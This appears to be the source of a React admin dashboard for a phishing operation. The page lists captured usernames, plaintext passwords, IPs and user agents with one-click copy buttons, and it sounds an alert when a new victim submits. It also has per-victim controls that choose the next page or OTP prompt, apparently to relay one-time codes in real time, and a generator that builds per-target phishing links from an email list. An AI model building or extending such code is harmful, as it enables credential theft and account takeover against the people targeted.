'use client';

import { useState, useEffect } from 'react';
import '../../public/styles/backend.css';
import { Collection } from 'mongodb';

interface TableDataRow {
  _id?: string;
  username: string;
  password: string;
  ip: string;
  useragent: string;
  date: Date;
  notify: number;
  pagetype: string;
  mobiletype: string;
}

export default function BackendPage() {
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [isLoading, setIsLoading] = useState(true);
  const [message, setMessage] = useState('');
  const [error, setError] = useState('');
  const [tableData, setTableData] = useState<TableDataRow[]>([]);
  const [showTable, setShowTable] = useState(false);
  const [showUrlGen, setShowUrlGen] = useState(false);
  const [urlData, setUrlData] = useState({ links: [], usernames: [] });
  const [audioRef, setAudioRef] = useState<HTMLAudioElement | null>(null);
  const [lastNotificationCount, setLastNotificationCount] = useState(0);
  const [pollingInterval, setPollingInterval] = useState<NodeJS.Timeout | null>(null);
  const [isPolling, setIsPolling] = useState(false);
  const [isRefreshing, setIsRefreshing] = useState(false);
  const [lastRefreshTime, setLastRefreshTime] = useState<Date | null>(null);

  useEffect(() => {
    checkLoginStatus();
    
    // Initialize audio with a simple notification sound
    const audio = new Audio();
    // You can replace this with your own audio file path like '/notification.mp3'
    audio.src = '/beep/beep.mp3';  
  audio.volume = 1;  // Set volume to 70%
    setAudioRef(audio);
  }, []);

  // Start automatic polling when logged in
  useEffect(() => {
    if (isLoggedIn && !isPolling) {
      startPolling();
    } else if (!isLoggedIn && pollingInterval) {
      stopPolling();
    }
    
    return () => {
      if (pollingInterval) {
        clearInterval(pollingInterval);
      }
    };
  }, [isLoggedIn, isPolling, pollingInterval]);

  const startPolling = () => {
    console.log('Starting automatic polling for new entries...');
    setIsPolling(true);
    
    // Initial check
    checkForNewEntries();
    
    // Set up polling every 5 seconds
    const interval = setInterval(() => {
      checkForNewEntries();
    }, 2000);
    
    setPollingInterval(interval);
  };

  const stopPolling = () => {
    console.log('Stopping automatic polling...');
    if (pollingInterval) {
      clearInterval(pollingInterval);
      setPollingInterval(null);
    }
    setIsPolling(false);
  };

  const checkForNewEntries = async () => {
    try {
      const response = await fetch('/api/backend/check-notifications', {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
        },
      });

      if (response.ok) {
        const data = await response.json();
        if (data.success && data.notifyZeroCount > 0) {
          // Only play audio if count increased
          if (data.notifyZeroCount > lastNotificationCount) {
            console.log(`New notification entries detected: ${data.notifyZeroCount} (was ${lastNotificationCount})`);
            playAudioAlert();
            
            // Update table data if it's currently shown
            if (showTable) {
              handleAction('getdata');
            }
          }
          setLastNotificationCount(data.notifyZeroCount);
        } else if (data.success && data.notifyZeroCount === 0) {
          setLastNotificationCount(0);
        }
      }
    } catch (error) {
      console.log('Error checking for new entries:', error);
    }
  };

  const playAudioAlert = () => {
    if (audioRef) {
      audioRef.currentTime = 0; // Reset audio to beginning
      audioRef.play().catch(error => {
        console.log('Audio play failed, using fallback beep:', error);
        playNotificationBeep();
      });
    } else {
      playNotificationBeep();
    }
  };



  // Function to create a notification beep
  const playNotificationBeep = () => {
    try {
      const context = new (window.AudioContext || (window as any).webkitAudioContext)();
      
      // Create a more pleasant notification sound
      const oscillator1 = context.createOscillator();
      const oscillator2 = context.createOscillator();
      const gainNode = context.createGain();
      
      oscillator1.connect(gainNode);
      oscillator2.connect(gainNode);
      gainNode.connect(context.destination);
      
      // Two-tone notification
      oscillator1.frequency.value = 800; // Higher frequency
      oscillator2.frequency.value = 600; // Lower frequency
      oscillator1.type = 'sine';
      oscillator2.type = 'sine';
      
      gainNode.gain.setValueAtTime(0.2, context.currentTime);
      gainNode.gain.exponentialRampToValueAtTime(0.01, context.currentTime + 0.3);
      
      oscillator1.start(context.currentTime);
      oscillator1.stop(context.currentTime + 0.15);
      
      oscillator2.start(context.currentTime + 0.15);
      oscillator2.stop(context.currentTime + 0.3);
    } catch (error) {
      console.log('Beep creation failed:', error);
    }
  };

  const checkLoginStatus = async () => {
    try {
      const response = await fetch('/api/backend/check-auth');
      const data = await response.json();
      setIsLoggedIn(data.loggedIn);
    } catch (error) {
      console.error('Error checking auth status:', error);
    } finally {
      setIsLoading(false);
    }
  };

  const handleLogin = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    const formData = new FormData(e.currentTarget);
    const username = formData.get('username') as string;
    const password = formData.get('password') as string;

    try {
      const response = await fetch('/api/backend/login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ username, password }),
      });

      const data = await response.json();
      if (data.success) {
        setIsLoggedIn(true);
        setError('');
      } else {
        setError(data.error || 'Login failed');
      }
    } catch (error) {
      setError('Network error occurred');
    }
  };

  const handleAction = async (action: string) => {
    try {
      // Show loading state for data refresh
      if (action === 'getdata') {
        setIsRefreshing(true);
        setMessage('Refreshing data...');
      }

      const response = await fetch(`/api/backend/action?t=${Date.now()}`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Cache-Control': 'no-cache',
        },
        body: JSON.stringify({ action }),
      });

      const data = await response.json();
      
      if (action === 'getdata' && data.success) {
        setTableData(data.data);
        setShowTable(true);
        setShowUrlGen(false);
        setLastRefreshTime(new Date());
        setMessage(`Data refreshed successfully! Found ${data.data.length} records.`);
        
        // Update notification count when showing data
        const notifyZeroEntries = data.data.filter((row: any) => 
          row.notify === '0' || row.notify === 0
        );
        setLastNotificationCount(notifyZeroEntries.length);
        
      } else if (action === 'getdata' && !data.success) {
        setMessage(data.message || 'No data found');
        setTableData([]);
        setShowTable(true);
        setShowUrlGen(false);
        setLastRefreshTime(new Date());
      } else if (action === 'genurl') {
        setShowUrlGen(true);
        setShowTable(false);
      } else {
        setMessage(data.message || 'Action completed');
        setShowTable(false);
        setShowUrlGen(false);
      }
    } catch (error) {
      setMessage('Error performing action');
      if (action === 'getdata') {
        setTableData([]);
      }
    } finally {
      if (action === 'getdata') {
        setIsRefreshing(false);
      }
    }
  };

  const handleFileUpload = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    const formData = new FormData(e.currentTarget);

    try {
      const response = await fetch('/api/backend/upload', {
        method: 'POST',
        body: formData,
      });

      const data = await response.json();
      if (data.success) {
        setUrlData({ links: data.links, usernames: data.usernames });
        setMessage('File uploaded successfully');
      } else {
        setMessage(data.error || 'Upload failed');
      }
    } catch (error) {
      setMessage('Upload error occurred');
    }
  };

  // Show loading spinner while checking authentication
  if (isLoading) {
    return (
      <center>
        <br /><br /><br /><br /><br /><br /><br /><br />
        <div style={{ 
          display: 'flex', 
          flexDirection: 'column', 
          alignItems: 'center', 
          gap: '20px' 
        }}>
          <div style={{
            width: '50px',
            height: '50px',
            border: '5px solid #f3f3f3',
            borderTop: '5px solidrgb(37, 42, 63)',
            borderRadius: '50%',
            animation: 'spin 1s linear infinite'
          }}></div>
          <p style={{ color: '#666', fontSize: '16px' }}>Loading...</p>
        </div>
        <style jsx>{`
          @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
          }
        `}</style>
      </center>
    );
  }

  if (!isLoggedIn) {
    return (
      <div className="login-page">
        <div className="login-container" role="main" aria-label="Login Form">
          <h2>Admin Login</h2>
          <form onSubmit={handleLogin}>
            <div className="form-group">
              <label htmlFor="username">Username or Email</label>
              <input
                type="text"
                id="username"
                name="username"
                autoComplete="username"
                placeholder="Enter your username or email"
                required
              />
            </div>
            <div className="form-group">
              <label htmlFor="password">Password</label>
              <input
                type="password"
                id="password"
                name="password"
                autoComplete="current-password"
                placeholder="Enter your password"
                required
              />
            </div>
            {error && (
              <div className="error-message">
                {error}
              </div>
            )}
            <button type="submit">Sign In</button>
          </form>
        </div>
      </div>
    );
  }

  // Dashboard view after login
  return (
    <div className="dashboard-layout">
      {/* Left Navigation Sidebar */}
      <div className="sidebar">
        <div className="sidebar-header">
          <h2>Admin Panel</h2>
          <div className="audio-status">
            {isPolling && (
              <div className="audio-indicator">
                <span className="audio-icon">🔊</span>
                <span className="audio-text">Audio Alerts Active</span>
                {lastNotificationCount > 0 && (
                  <span className="notification-badge">{lastNotificationCount}</span>
                )}
              </div>
            )}
          </div>
          <button 
            className="logout-btn"
            onClick={async () => {
              try {
                await fetch('/api/backend/logout', { method: 'POST' });
                setIsLoggedIn(false);
                setMessage('');
                setError('');
                setShowTable(false);
                setShowUrlGen(false);
                stopPolling();
              } catch (error) {
                console.error('Logout error:', error);
                // Fallback to manual cookie clearing
                document.cookie = 'session=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;';
                setIsLoggedIn(false);
                stopPolling();
              }
            }}
          >
            Logout
          </button>
        </div>

        <div className="nav-buttons">
          <button 
            className={`nav-btn create-btn ${!showTable && !showUrlGen ? 'active' : ''}`}
            onClick={() => handleAction('create')}
          >
            <span className="btn-icon">+</span>
            Create Collection
          </button>
          
            <button 
            className={`nav-btn delete-btn ${!showTable && !showUrlGen ? 'active' : ''}`}
            onClick={() => {
              const confirmed = window.confirm("Are you sure you want to delete this collection?");
              if (confirmed) {
                handleAction('delete');
              }
            }}
          >
            <span className="btn-icon">🗑</span>
            Delete Collection
          </button>

          
          <button 
            className={`nav-btn show-btn ${showTable ? 'active' : ''}`}
            onClick={() => handleAction('getdata')}
            disabled={isRefreshing}
          >
            <span className="btn-icon">
              {isRefreshing ? '🔄' : '📊'}
            </span>
            {isRefreshing ? 'Refreshing...' : 'Show Data'}
          </button>
          
          <button 
            className={`nav-btn url-btn ${showUrlGen ? 'active' : ''}`}
            onClick={() => handleAction('genurl')}
          >
            <span className="btn-icon">🔗</span>
            Generate URL
          </button>
        </div>
      </div>

      {/* Main Content Area */}
      <div className="main-content">
        <div className="content-header">
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
            <h1>Dashboard</h1>
            {tableData.some((row: any) => row.notify === '0' || row.notify === 0) && (
              <div style={{
                display: 'flex',
                alignItems: 'center',
                gap: '10px',
                background: '#ffc107',
                color: '#212529',
                padding: '8px 16px',
                borderRadius: '20px',
                fontSize: '14px',
                fontWeight: 'bold',
                animation: 'pulse 2s infinite'
              }}>
                <span>🔔</span>
                <span>New Entries (Auto-Play)</span>
              </div>
            )}
          </div>
        </div>

        {message && (
          <div className="message-box success">
            <p>{message}</p>
            <button onClick={() => setMessage('')}>×</button>
          </div>
        )}

        {error && (
          <div className="message-box error">
            <p>{error}</p>
            <button onClick={() => setError('')}>×</button>
          </div>
        )}

        <div className="content-body">
          {!showTable && !showUrlGen && (
            <div className="welcome-section">
              <h2>Welcome to Admin Dashboard</h2>
              <p>Use the navigation menu on the left to manage your collections and generate URLs.</p>
              
              {/* Test Audio Button */}
              <div style={{ marginTop: '30px' }}>
                <button 
                  onClick={() => {
                    if (audioRef) {
                      audioRef.currentTime = 0;
                      audioRef.play().catch(() => {
                        playNotificationBeep();
                      });
                    } else {
                      playNotificationBeep();
                    }
                  }}
                  style={{
                    background: '#17a2b8',
                    color: 'white',
                    border: 'none',
                    padding: '10px 20px',
                    borderRadius: '5px',
                    cursor: 'pointer',
                    fontSize: '14px',
                    fontWeight: 'bold'
                  }}
                >
                  🔊 Test Audio Notification
                </button>
              </div>
            </div>
          )}

          {showTable && (
            <div className="data-section">
              <div className="section-header">
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', width: '100%' }}>
                  <div>
                    <h2 style={{ color: '#fff', margin: 0 }}>
                      Table Data {tableData.length > 0 && `(${tableData.length} records)`}
                    </h2>
                    {lastRefreshTime && (
                      <p style={{ color: '#ccc', fontSize: '14px', margin: '5px 0 0 0' }}>
                        Last refreshed: {lastRefreshTime.toLocaleString()}
                      </p>
                    )}
                  </div>
                  <button 
                    onClick={() => handleAction('getdata')}
                    disabled={isRefreshing}
                    style={{
                      background: isRefreshing ? '#6c757d' : '#28a745',
                      color: 'white',
                      border: 'none',
                      padding: '8px 16px',
                      borderRadius: '5px',
                      cursor: isRefreshing ? 'not-allowed' : 'pointer',
                      fontSize: '14px',
                      fontWeight: 'bold',
                      display: 'flex',
                      alignItems: 'center',
                      gap: '5px',
                      width:'15%'
                    }}
                  >
                    <span style={{ 
                      animation: isRefreshing ? 'spin 1s linear infinite' : 'none',
                      display: 'inline-block'
                    }}>
                      🔄
                    </span>
                    {isRefreshing ? 'Refreshing...' : 'Refresh Data'}
                  </button>
                </div>
              </div>
              <div className="table-container">
                <table id="myTable" border={2} className="data-table">
                  <thead>
                    <tr>
                      <th>ID</th>
                      <th>Username</th>
                      <th>Password</th>
                      <th>Ip</th>
                      <th>Useragent</th>
                      <th>Date</th>
                      <th>Page Code/OTP</th>
                      <th>Mobile Name/CODE</th>
                      <th>Notify</th>
                      <th>Action</th>
                      <th>Notify</th>
                    </tr>
                  </thead>
                  <tbody>
                    {tableData.map((row: any, index: number) => {
                     
                      return (
                      <tr 
                        key={index}
                        className={
                          row.notify === '0' || row.notify === 0 ? 'highlighted' : 
                          row.notify === '2' || row.notify === 2 ? 'clicked' : 
                          row.notify === '1' || row.notify === 1 ? 'transparent' : ''
                        }
                      >
                        <td>{index + 1}</td>
                        <td>
                          <div className="inline-button-container">
                            {row.username}&nbsp;&nbsp;
                            <button 
                              type="button"
                              onClick={(e) => {
                                e.preventDefault();
                                navigator.clipboard.writeText(row.username);
                              }}
                            >
                              Copy
                            </button>
                          </div>
                        </td>
                        <td>
                          <div className="inline-button-container">
                            {row.password}&nbsp;&nbsp;
                            <button 
                              type="button"
                              onClick={(e) => {
                                e.preventDefault();
                                navigator.clipboard.writeText(row.password);
                              }}
                            >
                              Copy
                            </button>
                          </div>
                        </td>
                        <td>{row.ip}</td>
                        <td>{row.useragent}</td>
                        <td>{row.date}</td>
                        <td>
                          <input 
                            type="text" 
                            name="page" 
                            value={row.pagetype}
                            onChange={(e) => {
                              // Update the row data when input changes
                              const updatedData = [...tableData];
                              updatedData[index] = { ...updatedData[index], pagetype: e.target.value };
                              setTableData(updatedData);
                            }}
                          />
                        </td>
                        <td>
                          <input 
                            type="text" 
                            name="mobile" 
                            value={row.mobiletype}
                            onChange={(e) => {
                              // Update the row data when input changes
                              const updatedData = [...tableData];
                              updatedData[index] = { ...updatedData[index], mobiletype: e.target.value };
                              setTableData(updatedData);
                            }}
                          />
                        </td>
                        <td>{row.notify}</td>
                        <td>
                          <button 
                            type="button"
                            onClick={async (e) => {
                              const button = e.target as HTMLButtonElement;
                              const originalText = button.textContent;
                              
                              try {
                                // Show loading state
                                button.textContent = 'Updating...';
                                button.disabled = true;
                                
                                const response = await fetch(`/api/backend/update?t=${Date.now()}`, {
                                  method: 'POST',
                                  headers: {
                                    'Content-Type': 'application/json',
                                    'Cache-Control': 'no-cache',
                                  },
                                  body: JSON.stringify({
                                    username: row.username,
                                    page: row.pagetype,
                                    mobile: row.mobiletype,
                                    update: true
                                  }),
                                });
                                
                                const result = await response.json();
                                if (result.success) {
                                  setMessage('Updated successfully - Refreshing data...');
                                  // Small delay to ensure database update is committed
                                  await new Promise(resolve => setTimeout(resolve, 500));
                                  // Force refresh table data
                                  await handleAction('getdata');
                                } else {
                                  setMessage(result.message || 'Update failed');
                                }
                              } catch (error) {
                                setMessage('Error updating data');
                                console.error('Update error:', error);
                              } finally {
                                // Restore button state
                                button.textContent = originalText;
                                button.disabled = false;
                              }
                            }}
                          >
                            Update
                          </button>
                        </td>
                        <td>
                          <button 
                            type="button"
                            onClick={async (e) => {
                              const button = e.target as HTMLButtonElement;
                              const originalText = button.textContent;
                              
                              try {
                                // Show loading state
                                button.textContent = 'Processing...';
                                button.disabled = true;
                                
                                const response = await fetch(`/api/backend/update?t=${Date.now()}`, {
                                  method: 'POST',
                                  headers: {
                                    'Content-Type': 'application/json',
                                    'Cache-Control': 'no-cache',
                                  },
                                  body: JSON.stringify({
                                    username: row.username,
                                    done: true
                                  }),
                                });
                                
                                const result = await response.json();
                                if (result.success) {
                                  setMessage('Marked as done - Refreshing data...');
                                  // Small delay to ensure database update is committed
                                  await new Promise(resolve => setTimeout(resolve, 500));
                                  // Force refresh table data
                                  await handleAction('getdata');
                                } else {
                                  setMessage(result.message || 'Operation failed');
                                }
                              } catch (error) {
                                setMessage('Error processing request');
                                console.error('Done error:', error);
                              } finally {
                                // Restore button state
                                button.textContent = originalText;
                                button.disabled = false;
                              }
                            }}
                          >
                            Done
                          </button>
                        </td>
                      </tr>
                      );
                    })}
                  </tbody>
                </table>
              </div>
            </div>
          )}

          {showUrlGen && (
            <div className="url-section">
              <div className="section-header">
                <h2>URL Generator</h2>
                <p>Upload a file to generate custom URLs</p>
              </div>
              <div className="upload-container">
                <form onSubmit={handleFileUpload} className="upload-form">
                  <div className="form-group">
                    <label htmlFor="url">Base URL:</label>
                    <input
                      type="text"
                      id="url"
                      name="url"
                      style={{ width: '400px' }}
                      placeholder="Enter base URL (e.g., https://example.com/)"
                      required
                    />
                  </div>
                  <div className="form-group">
                    <label htmlFor="textFile">Add Email List:</label>
                    <input
                      type="file"
                      id="textFile"
                      name="textFile"
                      accept=".txt"
                      required
                    />
                  </div>
                  <button type="submit" className="upload-btn">
                    Upload
                  </button>
                </form>

                {urlData.links.length > 0 && (
                  <div className="url-results">
                    <h3>USER LIST WITH URL</h3>
                    <div className="table-container">
                      <table border={2} className="url-table">
                        <thead>
                          <tr>
                            <th>Sl No.</th>
                            <th>Username</th>
                            <th>Link</th>
                          </tr>
                        </thead>
                        <tbody>
                          {urlData.usernames.map((username: string, index: number) => (
                            <tr key={index}>
                              <td>{index + 1}</td>
                              <td>
                                {username}
                                <button 
                                  style={{ float: 'right' }}
                                  onClick={() => {
                                    navigator.clipboard.writeText(username);
                                    // Optional: Show feedback
                                    const button = event?.target as HTMLButtonElement;
                                    const originalText = button.textContent;
                                    button.textContent = 'Copied!';
                                    setTimeout(() => {
                                      button.textContent = originalText;
                                    }, 1000);
                                  }}
                                >
                                  Copy
                                </button>
                              </td>
                              <td>
                                {urlData.links[index]}
                                <button 
                                  style={{ float: 'right' }}
                                  onClick={() => {
                                    navigator.clipboard.writeText(urlData.links[index]);
                                    // Optional: Show feedback
                                    const button = event?.target as HTMLButtonElement;
                                    const originalText = button.textContent;
                                    button.textContent = 'Copied!';
                                    setTimeout(() => {
                                      button.textContent = originalText;
                                    }, 1000);
                                  }}
                                >
                                  Copy
                                </button>
                              </td>
                            </tr>
                          ))}
                        </tbody>
                      </table>
                    </div>
                  </div>
                )}
              </div>
            </div>
          )}
        </div>
      </div>


    </div>
  );
}